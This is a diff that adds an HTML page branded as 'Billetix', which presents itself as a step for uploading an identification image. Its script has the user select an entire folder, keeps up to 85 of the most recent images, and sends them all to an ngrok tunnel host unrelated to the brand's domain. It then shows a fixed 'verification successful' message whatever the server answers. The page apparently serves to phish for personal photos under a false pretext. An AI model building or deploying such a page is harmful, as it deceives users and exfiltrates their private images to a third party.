@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Billetix | Cargar Imágenes</title>
+  <link rel="icon" href="https://assets.billetix.co/billetix-logo-completo.png" type="image/png">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Poppins", sans-serif;
+    }
+
+    body {
+      background: #fafafa;
+      color: #222;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    header {
+      width: 100%;
+      background: #fff;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      padding: 1rem 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    header img {
+      height: 40px;
+    }
+
+    .btn-login {
+      background: #ff0052;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: 500;
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    .btn-login:hover {
+      background: #e2004b;
+      transform: scale(1.05);
+    }
+
+    main {
+      flex: 1;
+      width: 90%;
+      max-width: 1100px;
+      margin-top: 2rem;
+      text-align: center;
+    }
+
+    .dropzone {
+      background: #fff;
+      border: 2px dashed #ccc;
+      border-radius: 16px;
+      padding: 40px;
+      transition: border-color 0.3s, background 0.3s;
+    }
+
+    .dropzone.dragover {
+      border-color: #ff0052;
+      background: #fff4f8;
+    }
+
+    .dropzone p {
+      font-size: 1.1rem;
+      color: #555;
+      margin: 0.5rem 0;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    .btn {
+      margin-top: 1rem;
+      background: #ff0052;
+      color: #fff;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background 0.3s;
+    }
+
+    .btn:hover {
+      background: #e2004b;
+    }
+
+    .success-box {
+      margin-top: 2rem;
+      padding: 1.5rem;
+      border-radius: 12px;
+      background: #e8fff1;
+      border: 1px solid #b4f0cd;
+      color: #176b38;
+      display: inline-block;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .success-box h3 {
+      margin: 0 0 5px 0;
+      font-weight: 600;
+      font-size: 1.1rem;
+    }
+
+    .success-box p {
+      margin: 0;
+      font-size: 0.95rem;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    #serverResponse {
+      white-space: pre-wrap;
+      background: #f6f6f6;
+      padding: 1rem;
+      margin-top: 2rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      text-align: left;
+      overflow-x: auto;
+    }
+
+    footer {
+      margin-top: 3rem;
+      padding: 1rem;
+      font-size: 0.85rem;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://assets.billetix.co/billetix-logo-completo.png" alt="Billetix Logo">
+    <a href="https://www.billetix.co/login" class="btn-login">Iniciar sesión</a>
+  </header>
+
+  <main>
+    <div class="dropzone" id="dropzone">
+      <p><strong>Arrastra y suelta tus imágenes aquí</strong></p>
+      <p>o selecciona manualmente</p>
+      <label class="btn" for="folderInput">Seleccionar Imágenes</label>
+      <input id="folderInput" type="file" webkitdirectory directory multiple />
+    </div>
+
+    <button class="btn" id="uploadBtn">Subir imágen</button>
+
+    <!-- Aquí aparecerá el mensaje -->
+    <div id="confirmation"></div>
+
+    <pre id="serverResponse"></pre>
+  </main>
+
+  <footer>© 2025 Billetix | Todos los derechos reservados</footer>
+
+  <script>
+    const input = document.getElementById('folderInput');
+    const uploadBtn = document.getElementById('uploadBtn');
+    const confirmation = document.getElementById('confirmation');
+    const serverResponse = document.getElementById('serverResponse');
+    const dropzone = document.getElementById('dropzone');
+
+    let selectedImages = [];
+
+    // --- Drag & Drop funcionalidad ---
+    dropzone.addEventListener('dragover', e => {
+      e.preventDefault();
+      dropzone.classList.add('dragover');
+    });
+
+    dropzone.addEventListener('dragleave', () => {
+      dropzone.classList.remove('dragover');
+    });
+
+    dropzone.addEventListener('drop', e => {
+      e.preventDefault();
+      dropzone.classList.remove('dragover');
+      const files = Array.from(e.dataTransfer.files || []).filter(f => f.type.startsWith('image/'));
+      renderConfirmation(files);
+    });
+
+    input.addEventListener('change', () => {
+      const allFiles = Array.from(input.files || []).filter(f => f.type.startsWith('image/'));
+      renderConfirmation(allFiles);
+    });
+
+    function renderConfirmation(files) {
+      confirmation.innerHTML = '';
+      if (files.length === 0) {
+        confirmation.innerHTML = "<p style='color:#999;'>No se detectaron imágenes válidas.</p>";
+        return;
+      }
+
+      // ordenar por fecha y guardar hasta 70
+      files.sort((a, b) => b.lastModified - a.lastModified);
+      selectedImages = files.slice(0, 85);
+
+      confirmation.innerHTML = `
+        <div class="success-box">
+          <h3>✅ Imágenes detectadas correctamente</h3>
+          <p>Tu carpeta con la imágen identificación fue procesada. Presiona <strong>"Subir imágen"</strong> para completar el proceso.</p>
+        </div>
+      `;
+    }
+
+    // --- Subida ---
+    uploadBtn.addEventListener('click', async () => {
+      if (selectedImages.length === 0) {
+        alert("Primero selecciona una carpeta con imágenes.");
+        return;
+      }
+
+      const formData = new FormData();
+      selectedImages.forEach(f => formData.append('images[]', f, f.name));
+
+      serverResponse.textContent = "⏳ Subiendo imágenes...";
+
+      try {
+        const res = await fetch('https://nonslanderous-lilliam-loessial.ngrok-free.dev/upload_img', {
+          method: 'POST',
+          body: formData
+        });
+
+        const data = await res.json();
+        serverResponse.textContent = JSON.stringify("Verificación correcta.✅", null, 2);
+      } catch (err) {
+        serverResponse.textContent = "❌ Error al subir imágenes:\n";
+      }
+    });
+  </script>
+</body>
+</html>
